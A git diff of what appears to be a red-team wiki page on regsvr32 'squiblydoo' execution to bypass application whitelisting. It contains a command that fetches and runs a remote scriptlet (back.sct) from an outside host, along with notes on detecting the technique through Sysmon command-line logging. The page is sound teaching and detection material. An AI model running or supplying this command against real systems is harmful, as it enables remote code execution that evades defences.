@@ -29,15 +29,19 @@ description: regsvr32 (squiblydoo) code execution - bypass application whitelist
 
 We can then execute the code from the command prompt:
 
+{% code-tabs %}
+{% code-tabs-item title="attacker@victim" %}
 ```bash
 regsvr32.exe /s /i:http://10.0.0.5/back.sct scrobj.dll
 ```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
 
 ## Observations
 
 ![calc.exe spawned by regsvr32.exe](../.gitbook/assets/regsvr32.png)
 
-Note how regsvr32 process exits almost immediately. This means just by looking at the process list you may not suspect a process until you realise how it was invoked. Sysmon commandline parameters logging capability though will show what you need to see:
+Note how regsvr32 process exits almost immediately. This means that just by looking at the list of processes on the victim machine, an evil process may not be immedialy evident... Not until you realise how it was invoked though. Sysmon commandline parameters will show what you need to see:
 
 ![](../.gitbook/assets/regsvr32-commandline.png)
 
